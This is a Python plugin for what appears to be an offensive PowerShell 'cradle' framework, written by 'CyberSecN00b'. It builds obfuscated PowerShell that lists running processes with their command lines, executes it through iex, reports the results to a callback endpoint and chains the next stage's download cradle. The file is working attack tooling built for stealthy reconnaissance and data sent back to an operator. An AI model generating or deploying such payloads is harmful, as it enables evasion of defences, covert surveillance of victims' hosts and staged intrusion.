from plugins._base import BaseCradlePlugin
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr

class EnumProcessesPsSgr(BaseCradlePlugin):
    NAME        = "enum_processes_ps_sgr"
    DESCRIPTION = "Enumeration - Gets running processes using SGR (Seeded Get-Random) obfuscated PowerShell"
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        "ENUM_METHOD": {
            "description": "Enumeration Method: Get-CimInstance, Get-WmiObject, Get-Process (may not have command lines)",
            "default": "Get-CimInstance",
            "restricted_to": ["Get-CimInstance", "Get-WmiObject", "Get-Process"]
        },
        **BaseCradlePlugin.OPTIONS
    }

    def generate(self, inst: CradleInstance) -> str:
        method  = inst.options.get("ENUM_METHOD", "Get-CimInstance").lower()
        payload = []

        if method == "get-ciminstance":
            payload.append(
                f"({sgr("$proc_list = (Get-CimInstance Win32_Process | Select-Object ProcessId, Name, CommandLine)")})|iex;"
            )
        elif method == "get-wmiobject":
            payload.append(
                f"({sgr("$proc_list = (Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine)")})|iex;"
            )
        else:
            payload.append(
                f"({sgr("$proc_list = (Get-Process | Select-Object Id, Name, CommandLine)")})|iex;"
            )

        payload.append(
            self.notification_callback_snippet(inst,{"proc_list":"$proc_list"})
        )

        if self._endpoint_registry:
            cradle_command = self._endpoint_registry.get_cradle_command(inst.options.get("NEXT_CRADLE",0))
            if cradle_command:
                payload.append(
                    cradle_command
                )

        return "\n".join(payload) + "\n"